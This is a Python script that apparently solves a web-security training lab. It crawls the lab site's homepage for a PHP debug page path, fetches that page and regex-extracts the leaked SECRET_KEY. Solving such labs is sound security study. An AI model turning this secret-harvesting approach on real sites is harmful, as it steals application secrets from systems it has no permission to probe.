import requests
from bs4 import BeautifulSoup
import re

site = "0ab3002a034f4dde80c73f5600de002d.web-security-academy.net"
base_url = f"https://{site}"
s = requests.Session()

# Step 1: Fetch homepage
resp = s.get(base_url)
soup = BeautifulSoup(resp.text, "html.parser")

# Step 2: Search for raw text that mentions debug paths
text_matches = soup.find_all(string=re.compile(r"/.*php"))
debug_path = None

for line in text_matches:
    match = re.search(r"(/[\w\-/]*\.php)", line)
    if match:
        debug_path = match.group(1)
        break

if not debug_path:
    print("[!] Still couldn't find debug path in page text.")
    exit(1)

debug_url = f"{base_url}{debug_path}"
print(f"[*] Found debug path: {debug_url}")

# Step 3: Fetch the debug page
resp = s.get(debug_url)

# Step 4: Extract SECRET_KEY from the page (more flexible parsing)
match = re.search(r'SECRET_KEY(?:\s+=>\s+|\s*</td><td[^>]*>)([a-zA-Z0-9]+)', resp.text)
if match:
    secret = match.group(1)
    print(f"[✓] SECRET_KEY Leaked: {secret}")
    print("[✓] Submit the key manually to complete the lab.")
else:
    print("[!] SECRET_KEY not found. Dumping relevant debug lines:")
    for line in resp.text.splitlines():
        if "SECRET_KEY" in line:
            print(line.strip())
